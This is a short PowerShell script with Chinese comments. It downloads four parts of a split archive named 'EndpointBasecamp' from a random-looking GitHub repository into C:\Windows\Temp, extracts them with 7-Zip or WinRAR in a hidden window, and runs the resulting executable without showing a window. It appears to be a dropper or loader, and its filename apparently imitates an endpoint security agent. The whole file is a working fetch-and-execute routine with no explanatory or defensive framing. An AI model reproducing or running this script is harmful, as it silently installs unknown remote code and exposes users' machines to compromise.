$ErrorActionPreference = "Stop"

# 檢查是否存在 7z 或 WinRAR
$sevenZipPath = "C:\Program Files\7-Zip\7z.exe"
$winrarPath = "C:\Program Files\WinRAR\WinRAR.exe"

if (Test-Path $sevenZipPath) {
    $extractor = $sevenZipPath
    $arguments = 'x "EndpointBasecamp.zip.001" -o"C:\Windows\Temp"'
} elseif (Test-Path $winrarPath) {
    $extractor = $winrarPath
    $arguments = 'x "EndpointBasecamp.zip.001" "C:\Windows\Temp"'
} else {
    exit 1
}

# 下載檔案
Set-Location C:\Windows\Temp
Invoke-WebRequest -Uri "https://github.com/uvUpAjx4Zp/Khsw/raw/refs/heads/main/EndpointBasecamp.zip.001" -OutFile "EndpointBasecamp.zip.001"
Invoke-WebRequest -Uri "https://github.com/uvUpAjx4Zp/Khsw/raw/refs/heads/main/EndpointBasecamp.zip.002" -OutFile "EndpointBasecamp.zip.002"
Invoke-WebRequest -Uri "https://github.com/uvUpAjx4Zp/Khsw/raw/refs/heads/main/EndpointBasecamp.zip.003" -OutFile "EndpointBasecamp.zip.003"
Invoke-WebRequest -Uri "https://github.com/uvUpAjx4Zp/Khsw/raw/refs/heads/main/EndpointBasecamp.zip.004" -OutFile "EndpointBasecamp.zip.004"

# 解壓縮
$startInfo = New-Object System.Diagnostics.ProcessStartInfo
$startInfo.FileName = $extractor
$startInfo.Arguments = $arguments
$startInfo.CreateNoWindow = $true
$startInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
$process = [System.Diagnostics.Process]::Start($startInfo)
$process.WaitForExit()

# 執行解壓後的檔案
$startInfo = New-Object System.Diagnostics.ProcessStartInfo
$startInfo.FileName = "C:\Windows\Temp\EndpointBasecamp.exe"
$startInfo.CreateNoWindow = $true
$startInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
[System.Diagnostics.Process]::Start($startInfo)
